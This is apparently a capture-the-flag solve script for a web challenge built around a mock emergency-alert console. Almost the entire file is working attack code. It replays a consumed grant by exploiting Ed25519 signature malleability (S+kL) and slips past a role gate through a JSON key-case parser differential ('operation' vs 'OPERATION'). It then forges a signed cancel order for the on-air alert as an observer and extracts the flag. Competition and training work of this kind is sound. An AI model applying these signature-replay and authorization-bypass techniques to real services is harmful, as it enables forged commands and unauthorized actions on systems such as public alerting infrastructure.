#!/usr/bin/env python3
"""Landfall — CSCTF 2026 (Web). ANWA NAOG emergency-alert console.

Chains four bugs to cancel the fabricated on-air alert as an observer:
  1. Ed25519 S+kL malleability -> fresh sig_sha256 (single-use bypass)
  2. JSON key-case parser differential (operation vs OPERATION) -> role bypass
  3. covering capability grant selection
  4. sha256 unlock digest over the on-air message

Usage: python3 solve.py http://<assigned-host>:<port> [passphrase]
The instance rotates its session/grants, so everything is re-derived per run.
"""
import base64
import hashlib
import json
import re
import sys
import urllib.error
import urllib.request

B = sys.argv[1].rstrip("/")
PASS_OVERRIDE = sys.argv[2] if len(sys.argv) > 2 else None
L = 2**252 + 27742317777372353535851937790883648493  # Ed25519 group order


def b64u_dec(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64u_enc(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def req(path, method="GET", token=None, raw_body=None):
    data = raw_body.encode() if raw_body is not None else None
    r = urllib.request.Request(B + path, data=data, method=method)
    if token:
        r.add_header("Authorization", "Bearer " + token)
    if data is not None:
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, timeout=25) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def main():
    # 1. console -> operator + passphrase
    _, html = req("/")
    m_op = re.search(r"operator <b>([^<]+)</b>", html) or re.search(
        r"<dt>operator</dt><dd><code>([^<]+)</code>", html
    )
    m_pw = re.search(r"<dt>passphrase</dt><dd><code>([^<]+)</code>", html)
    operator = m_op.group(1) if m_op else "r.tolm"
    passphrase = PASS_OVERRIDE or (m_pw.group(1) if m_pw else None)

    # 2. session
    _, body = req("/api/v1/session", "POST", raw_body=json.dumps({"operator": operator, "passphrase": passphrase}))
    token = json.loads(body)["token"]
    print("[*] session as", operator, "role", json.loads(body).get("role"))

    # 3. current on-air message -> cap id, references triple, severity, areas
    _, cur = req("/feed/cap/current")
    cid = re.search(r"<identifier>([^<]+)</identifier>", cur).group(1)
    sender = re.search(r"<sender>([^<]+)</sender>", cur).group(1)
    sent = re.search(r"<sent>([^<]+)</sent>", cur).group(1)
    sev = re.search(r"<severity>([^<]+)</severity>", cur).group(1)
    areas = re.findall(r"<value>([^<]+)</value>", cur)
    references = f"{sender},{cid},{sent}"
    print(f"[*] on-air {cid} sev={sev} area={areas}")

    # 4. owning authority + operational clock + consumed sigs
    _, auth = req("/reference/authorities")
    owner = next((a["authority_id"] for a in json.loads(auth)["authorities"] if set(areas) & set(a["geocodes"])), None)
    _, clk = req("/reference/clock")
    opnow = json.loads(clk)["operational_time"]
    _, led = req("/audit/ledger", token=token)
    consumed = {e["sig_sha256"] for e in json.loads(led).get("entries", []) if e.get("sig_sha256")}

    # 5. covering grant (auth + area + severity + validity window)
    rank = {"Minor": 0, "Moderate": 1, "Severe": 2, "Extreme": 3}
    _, arc = req("/feed/cap/archive")
    chosen = None
    for al in json.loads(arc)["alerts"]:
        _, d = req("/feed/cap/archive/" + al["identifier"])
        gm = re.search(r'(\{"payload":"[^"]*","sig":"[^"]*"\})', d)
        if not gm:
            continue
        g = json.loads(gm.group(1))
        cl = json.loads(b64u_dec(g["payload"]))
        if (
            cl.get("auth") == owner
            and set(areas) <= set(cl.get("geo", []))
            and rank.get(cl.get("sev_max"), -1) >= rank.get(sev, 99)
            and cl["nbf"] <= opnow <= cl["exp"]
        ):
            chosen = (g, cl)
            break
    if not chosen:
        sys.exit("[!] no covering grant")
    g, cl = chosen
    jti = cl["jti"]

    # 6. malleate S+kL until sig_sha256 is unconsumed
    raw = b64u_dec(g["sig"])
    R, S = raw[:32], int.from_bytes(raw[32:], "little")
    for k in range(1, 8):
        cand = R + (S + k * L).to_bytes(32, "little")
        if hashlib.sha256(cand).hexdigest() not in consumed:
            grant = {"payload": g["payload"], "sig": b64u_enc(cand)}
            print(f"[*] grant {jti} using S+{k}L")
            break

    # 7. unlock digest + CAP cancel
    unlock = hashlib.sha256(f"landfall|{cid}|{jti}|{','.join(sorted(areas))}".encode()).hexdigest()
    cap = {
        "msgType": "Cancel",
        "references": references,
        "severity": sev,
        "area": areas,
        "headline": "Cancellation of fabricated evacuation order",
    }

    # 8. key-case differential on the v1 passthrough:
    #    exact-case "operation" -> handler executes dispatch,
    #    "OPERATION" -> role gate sees preview (observer allowed).
    body = (
        '{"operation":"dispatch","OPERATION":"preview","authorization":%s,"payload":%s,"unlock":%s}'
        % (json.dumps(grant), json.dumps(cap), json.dumps(unlock))
    )
    st, r = req("/api/v1/orders/staged", "POST", token=token, raw_body=body)
    print("[*] staged ->", st, r[:400])
    fm = re.search(r"CSCTF\{[^}]+\}", r) or re.search(r"CSCTF\{[^}]+\}", req("/feed/cap/current")[1])
    if fm:
        print("\n[FLAG]", fm.group(0))


if __name__ == "__main__":
    main()
